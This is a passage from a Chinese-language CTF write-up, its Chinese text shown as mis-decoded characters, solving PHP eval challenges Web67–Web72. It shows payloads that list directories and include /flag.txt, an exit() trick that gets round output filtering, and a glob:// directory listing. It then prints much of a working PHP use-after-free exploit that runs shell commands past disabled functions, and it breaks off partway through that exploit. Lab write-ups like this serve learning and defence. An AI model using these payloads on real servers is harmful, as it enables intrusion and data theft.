class="comment">#Array ( [0] =&gt; . [1] =&gt; .. [2] =&gt; .dockerenv [3] =&gt; bin [4] =&gt; dev [5] =&gt; etc [6] =&gt; flag.txt [7] =&gt; home [8] =&gt; lib [9] =&gt; media [10] =&gt; mnt [11] =&gt; opt [12] =&gt; proc [13] =&gt; root [14] =&gt; run [15] =&gt; sbin [16] =&gt; srv [17] =&gt; sys [18] =&gt; tmp [19] =&gt; usr [20] =&gt; var ) </span></span><br></pre></td></tr></table></figure><p>â€‹é‚£å°±ç”¨ highlight_file å»è¯»æ ¹ç›®å½•ï¼š</p><h1 id="web67"><a class="markdownIt-Anchor" href="#web67">#</a> Web67ï¼š</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ä½ ä»¬åœ¨ç‚«æŠ€å—ï¼Ÿ</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$c</span>= <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>â€‹print_r è¢«è¿‡æ»¤äº†ï¼Œè¯•è¯•çœ‹ var_dumpï¼Œæ²¡æœ‰è¢«è¿‡æ»¤ï¼Œç»§ç»­ scandir å»è¯»ç›®å½•ç»“æ„ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">scandir</span>(<span class="string">&quot;/&quot;</span>));</span><br><span class="line">c=<span class="title function_ invoke__">highlight_file</span>(<span class="string">&quot;/flag.txt&quot;</span>);</span><br></pre></td></tr></table></figure><h1 id="web68"><a class="markdownIt-Anchor" href="#web68">#</a> Web68ï¼š</h1><p>â€‹ç”±äº highlight_file () è¢« ban äº†ï¼Œè¯»ä¸åˆ°æºç ï¼Œæ‰€ä»¥å°±ç›´æ¥å¼€æ‰“äº†ï¼Œå…ˆæµ‹ä¸€ä¸‹ var_dumpï¼Œvar_dump å’Œ scandir éƒ½æ²¡æœ‰è¢« banï¼Œç›´æ¥è¯»æ ¹ç›®å½•ï¼Œæ‰¾åˆ°äº† flag.txtï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">scandir</span>(<span class="string">&quot;/&quot;</span>));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#array(21) &#123; [0]=&gt; string(1) &quot;.&quot; [1]=&gt; string(2) &quot;..&quot; [2]=&gt; string(10) &quot;.dockerenv&quot; [3]=&gt; string(3) &quot;bin&quot; [4]=&gt; string(3) &quot;dev&quot; [5]=&gt; string(3) &quot;etc&quot; [6]=&gt; string(8) &quot;flag.txt&quot; [7]=&gt; string(4) &quot;home&quot; [8]=&gt; string(3) &quot;lib&quot; [9]=&gt; string(5) &quot;media&quot; [10]=&gt; string(3) &quot;mnt&quot; [11]=&gt; string(3) &quot;opt&quot; [12]=&gt; string(4) &quot;proc&quot; [13]=&gt; string(4) &quot;root&quot; [14]=&gt; string(3) &quot;run&quot; [15]=&gt; string(4) &quot;sbin&quot; [16]=&gt; string(3) &quot;srv&quot; [17]=&gt; string(3) &quot;sys&quot; [18]=&gt; string(3) &quot;tmp&quot; [19]=&gt; string(3) &quot;usr&quot; [20]=&gt; string(3) &quot;var&quot; &#125; </span></span><br></pre></td></tr></table></figure><p>â€‹ä¹‹åå°±æ˜¯å…¶ä»–æ‰‹æ³•äº†ï¼Œæ ¹æ® txt æ–‡ä»¶ï¼Œæ¨æµ‹ flag åº”è¯¥ä¸ä¼šè¢«å½“ä½œ php ä»£ç æ‰§è¡Œï¼Œæ‰€ä»¥è¯•ç€ä½¿ç”¨æ–‡ä»¶åŒ…å«ç­‰æ‰‹æ³•è¯» flagï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="keyword">include</span>(<span class="string">&quot;/flag.txt&quot;</span>);</span><br></pre></td></tr></table></figure><h1 id="web69"><a class="markdownIt-Anchor" href="#web69">#</a> Web69ï¼š</h1><p>â€‹ban äº† highlight_fileã€var_dumpï¼Œé‚£å°±ç”¨ var_exportï¼Œè¾“å‡ºç›®å½•ç»“æ„ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="title function_ invoke__">var_export</span>(<span class="title function_ invoke__">scandir</span>(<span class="string">&quot;/&quot;</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">#array ( 0 =&gt; &#x27;.&#x27;, 1 =&gt; &#x27;..&#x27;, 2 =&gt; &#x27;.dockerenv&#x27;, 3 =&gt; &#x27;bin&#x27;, 4 =&gt; &#x27;dev&#x27;, 5 =&gt; &#x27;etc&#x27;, 6 =&gt; &#x27;flag.txt&#x27;, 7 =&gt; &#x27;home&#x27;, 8 =&gt; &#x27;lib&#x27;, 9 =&gt; &#x27;media&#x27;, 10 =&gt; &#x27;mnt&#x27;, 11 =&gt; &#x27;opt&#x27;, 12 =&gt; &#x27;proc&#x27;, 13 =&gt; &#x27;root&#x27;, 14 =&gt; &#x27;run&#x27;, 15 =&gt; &#x27;sbin&#x27;, 16 =&gt; &#x27;srv&#x27;, 17 =&gt; &#x27;sys&#x27;, 18 =&gt; &#x27;tmp&#x27;, 19 =&gt; &#x27;usr&#x27;, 20 =&gt; &#x27;var&#x27;, )</span></span><br></pre></td></tr></table></figure><p>â€‹ä¹‹å include åŒ…å« /flag.txt æ–‡ä»¶å³å¯å¾—åˆ° flagã€‚</p><h1 id="web70"><a class="markdownIt-Anchor" href="#web70">#</a> Web70ï¼š</h1><p>â€‹é€šè¿‡ var_export è¯»å–æ–‡ä»¶ç›®å½•ç»“æ„ï¼Œå†ç”¨ include åŒ…å« /flag.txtï¼Œå’Œä¸Šé¢å‡ ä¸ªé¢˜æ²¡æœ‰ä»»ä½•åŒºåˆ«ã€‚</p><h1 id="web71"><a class="markdownIt-Anchor" href="#web71">#</a> Web71ï¼š</h1><p>â€‹é™„ä»¶é‡Œç»™äº†æºç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;display_errors&#x27;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="comment">// ä½ ä»¬åœ¨ç‚«æŠ€å—ï¼Ÿ</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$c</span>= <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">        <span class="variable">$s</span> = <span class="title function_ invoke__">ob_get_contents</span>();</span><br><span class="line">        <span class="title function_ invoke__">ob_end_clean</span>();</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/[0-9]|[a-z]/i&quot;</span>,<span class="string">&quot;?&quot;</span>,<span class="variable">$s</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>â€‹æœ‰å‡ ä¸ªç‚¹éœ€è¦æ³¨æ„ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$s</span> = <span class="title function_ invoke__">ob_get_contents</span>();<span class="comment">//å¾—åˆ°ç¼“å†²åŒºçš„æ•°æ®ã€‚</span></span><br><span class="line"><span class="title function_ invoke__">ob_end_clean</span>();<span class="comment">//ä¼šæ¸…é™¤ç¼“å†²åŒºçš„å†…å®¹ï¼Œå¹¶å°†ç¼“å†²åŒºå…³é—­ï¼Œä½†ä¸ä¼šè¾“å‡ºå†…å®¹</span></span><br></pre></td></tr></table></figure><p>â€‹ä¹Ÿå°±æ˜¯è¯´ï¼Œè¿™é‡Œéœ€è¦åœ¨æ‰§è¡Œä¸Šé¢ä¸¤ä¸ªå‡½æ•°ä¹‹å‰ï¼ŒæŠŠç¨‹åºè¾“å‡ºå‡ºæ¥å°±è¡Œäº†ï¼Œè¿™ä¸ªæ—¶å€™ï¼Œå°±å¯ä»¥é€‰æ‹©æå‰ç»“æŸæ‰æ•´ä¸ªç¨‹åºï¼Œå› ä¸ºç¼“å†²åŒºå°±æ˜¯åœ¨ç¨‹åºç»“æŸä¹‹å‰éœ€è¦å°†é‡Œé¢çš„æ‰€æœ‰å†…å®¹å…¨éƒ¨è¾“å‡ºæ‰è¡Œï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="title function_ invoke__">var_export</span>(<span class="title function_ invoke__">scandir</span>(<span class="string">&#x27;/&#x27;</span>));<span class="keyword">exit</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">#array ( 0 =&gt; &#x27;.&#x27;, 1 =&gt; &#x27;..&#x27;, 2 =&gt; &#x27;.dockerenv&#x27;, 3 =&gt; &#x27;bin&#x27;, 4 =&gt; &#x27;dev&#x27;, 5 =&gt; &#x27;etc&#x27;, 6 =&gt; &#x27;flag.txt&#x27;, 7 =&gt; &#x27;home&#x27;, 8 =&gt; &#x27;lib&#x27;, 9 =&gt; &#x27;media&#x27;, 10 =&gt; &#x27;mnt&#x27;, 11 =&gt; &#x27;opt&#x27;, 12 =&gt; &#x27;proc&#x27;, 13 =&gt; &#x27;root&#x27;, 14 =&gt; &#x27;run&#x27;, 15 =&gt; &#x27;sbin&#x27;, 16 =&gt; &#x27;srv&#x27;, 17 =&gt; &#x27;sys&#x27;, 18 =&gt; &#x27;tmp&#x27;, 19 =&gt; &#x27;usr&#x27;, 20 =&gt; &#x27;var&#x27;, )</span></span><br></pre></td></tr></table></figure><p>â€‹ä¹‹åå°±</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="keyword">include</span>(<span class="string">&quot;/flag.txt&quot;</span>);<span class="keyword">exit</span>();</span><br></pre></td></tr></table></figure><h1 id="web72"><a class="markdownIt-Anchor" href="#web72">#</a> Web72ï¼š</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;display_errors&#x27;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="comment">// ä½ ä»¬åœ¨ç‚«æŠ€å—ï¼Ÿ</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$c</span>= <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">        <span class="variable">$s</span> = <span class="title function_ invoke__">ob_get_contents</span>();</span><br><span class="line">        <span class="title function_ invoke__">ob_end_clean</span>();</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/[0-9]|[a-z]/i&quot;</span>,<span class="string">&quot;?&quot;</span>,<span class="variable">$s</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>â€‹scandir è¢«ç¦äº†ï¼Œè¿™é‡Œæ²¡ä»€ä¹ˆæ€è·¯ï¼Œä¸è¿‡ï¼Œè¿™é‡Œæœ‰å¤§ä½¬é€šè¿‡ glob ä¼ªåè®®è¯»å–äº†æ ¹ç›®å½•æ–‡ä»¶åï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="variable">$a</span>=<span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&quot;glob:///*&quot;</span>);<span class="keyword">foreach</span>(<span class="variable">$a</span> <span class="keyword">as</span> <span class="variable">$f</span>)&#123;<span class="keyword">echo</span> <span class="variable">$f</span>.<span class="string">&quot;    &quot;</span> ;&#125;<span class="keyword">exit</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">#bin dev etc flag0.txt home lib media mnt opt proc root run sbin srv sys tmp usr var </span></span><br></pre></td></tr></table></figure><p>â€‹é€šè¿‡ include è¯»å–æ–‡ä»¶çš„æ—¶å€™å‘ç°æ²¡æœ‰æƒé™ï¼Œå…ˆåˆ—ä¸€äº›è¯»å–æ–‡ä»¶çš„å‡½æ•°å§ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">readfile</span>(<span class="variable">$filename</span>);</span><br><span class="line"><span class="variable">$file</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&quot;example.txt&quot;</span>, <span class="string">&quot;r&quot;</span>);<span class="variable">$content</span> = <span class="title function_ invoke__">fread</span>(<span class="variable">$file</span>, <span class="title function_ invoke__">filesize</span>(<span class="string">&quot;example.txt&quot;</span>));<span class="title function_ invoke__">fclose</span>(<span class="variable">$file</span>);</span><br><span class="line"><span class="variable">$fileContents</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;example.txt&quot;</span>);</span><br></pre></td></tr></table></figure><p>â€‹ä¹‹åå°±æ˜¯åˆ©ç”¨ uaf è„šæœ¬è¿›è¡Œå‘½ä»¤æ‰§è¡Œäº†ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="meta">?&gt;</span><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">pwn</span>(<span class="string">&quot;ls /;cat /flag0.txt&quot;</span>);</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">pwn</span>(<span class="params"><span class="variable">$cmd</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$abc</span>, <span class="variable">$helper</span>, <span class="variable">$backtrace</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Vuln</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$backtrace</span>; </span><br><span class="line">            <span class="keyword">unset</span>(<span class="variable language_">$this</span>-&gt;a);</span><br><span class="line">            <span class="variable">$backtrace</span> = (<span class="keyword">new</span> <span class="built_in">Exception</span>)-&gt;<span class="title function_ invoke__">getTrace</span>(); <span class="comment"># ;)</span></span><br><span class="line">            <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$backtrace</span>[<span class="number">1</span>][<span class="string">&#x27;args&#x27;</span>])) &#123; <span class="comment"># PHP &gt;= 7.4</span></span><br><span class="line">                <span class="variable">$backtrace</span> = <span class="title function_ invoke__">debug_backtrace</span>();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Helper</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$a</span>, <span class="variable">$b</span>, <span class="variable">$c</span>, <span class="variable">$d</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">str2ptr</span>(<span class="params">&amp;<span class="variable">$str</span>, <span class="variable">$p</span> = <span class="number">0</span>, <span class="variable">$s</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$address</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$j</span> = <span class="variable">$s</span>-<span class="number">1</span>; <span class="variable">$j</span> &gt;= <span class="number">0</span>; <span class="variable">$j</span>--) &#123;</span><br><span class="line">            <span class="variable">$address</span> &lt;&lt;= <span class="number">8</span>;</span><br><span class="line">            <span class="variable">$address</span> |= <span class="title function_ invoke__">ord</span>(<span class="variable">$str</span>[<span class="variable">$p</span>+<span class="variable">$j</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$address</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">ptr2str</span>(<span class="params"><span class="variable">$ptr</span>, <span class="variable">$m</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$out</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$m</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$out</span> .= <span class="title function_ invoke__">sprintf</span>(<span class="string">&#x27;%c&#x27;</span>,<span class="variable">$ptr</span> &amp; <span class="number">0xff</span>);</span><br><span class="line">            <span class="variable">$ptr</span> &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$out</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params">&amp;<span class="variable">$str</span>, <span class="variable">$p</span>, <span class="variable">$v</span>, <span class="variable">$n</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$i</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$n</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$str</span>[<span class="variable">$p</span> + <span class="variable">$i</span>] = <span class="title function_ invoke__">sprintf</span>(<span class="string">&#x27;%c&#x27;</span>,<span class="variable">$v</span> &amp; <span class="number">0xff</span>);</span><br><span class="line">            <span class="variable">$v</span> &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">leak</span>(<span class="params"><span class="variable">$addr</span>, <span class="variable">$p</span> = <span class="number">0</span>, <span class="variable">$s</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$abc</span>, <span class="variable">$helper</span>;</span><br><span class="line">        <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x68</span>, <span class="variable">$addr</span> + <span class="variable">$p</span> - <span class="number">0x10</span>);</span><br><span class="line">        <span class="variable">$leak</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$helper</span>-&gt;a);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$s</span> != <span class="number">8</span>) &#123; <span class="variable">$leak</span> %= <span class="number">2</span> &lt;&lt; (<span class="variable">$s</span> * <span class="number">8</span>) - <span class="number">1</span>; &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$leak</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">parse_elf</span>(<span class="params"><span class="variable">$base</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$e_type</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$base</span>, <span class="number">0x10</span>, <span class="number">2</span>);</span><br><span class="line"> </span><br><span class="line">        <span class="variable">$e_phoff</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$base</span>, <span class="number">0x20</span>);</span><br><span class="line">        <span class="variable">$e_phentsize</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$base</span>, <span class="number">0x36</span>, <span class="number">2</span>);</span><br><span class="line">        <span class="variable">$e_phnum</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$base</span>, <span class="number">0x38</span>, <span class="number">2</span>);</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$e_phnum</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$header</span> = <span class="variable">$base</span> + <span class="variable">$e_phoff</span> + <span class="variable">$i</span> * <span class="variable">$e_phentsize</span>;</span><br><span class="line">            <span class="variable">$p_type</span>  = <span class="title function_ invoke__">leak</span>(<span class="variable">$header</span>, <span class="number">0</span>, <span class="number">4</span>);</span><br><span class="line">            <span class="variable">$p_flags</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$header</span>, <span class="number">4</span>, <span class="number">4</span>);</span><br><span class="line">            <span class="variable">$p_vaddr</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$header</span>, <span class="number">0x10</span>);</span><br><span class="line">            <span class="variable">$p_memsz</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$header</span>, <span class="number">0x28</span>);</span><br><span class="line"> </span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$p_type</span> == <span class="number">1</span> &amp;&amp; <span class="variable">$p_flags</span> == <span class="number">6</span>) &#123; <span class="comment"># PT_LOAD, PF_Read_Write</span></span><br><span class="line">                <span class="comment"># handle pie</span></span><br><span class="line">                <span class="variable">$data_addr</span> = <span class="variable">$e_type</span> == <span class="number">2</span> ? <span class="variable">$p_vaddr</span> : <span class="variable">$base</span> + <span class="variable">$p_vaddr</span>;</span><br><span class="line">                <span class="variable">$data_size</span> = <span class="variable">$p_memsz</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$p_type</span> == <span class="number">1</span> &amp;&amp; <span class="variable">$p_flags</span> == <span class="number">5</span>) &#123; <span class="comment"># PT_LOAD, PF_Read_exec</span></span><br><span class="line">                <span class="variable">$text_size</span> = <span class="variable">$p_memsz</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">if</span>(!<span class="variable">$data_addr</span> || !<span class="variable">$text_size</span> || !<span class="variable">$data_size</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">return</span> [<span class="variable">$data_addr</span>, <span class="variable">$text_size</span>, <span class="variable">$data_size</span>];</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_basic_funcs</span>(<span class="params"><span class="variable">$base</span>, <span class="variable">$elf</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">list</span>(<span class="variable">$data_addr</span>, <span class="variable">$text_size</span>, <span class="variable">$data_size</span>) = <span class="variable">$elf</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; 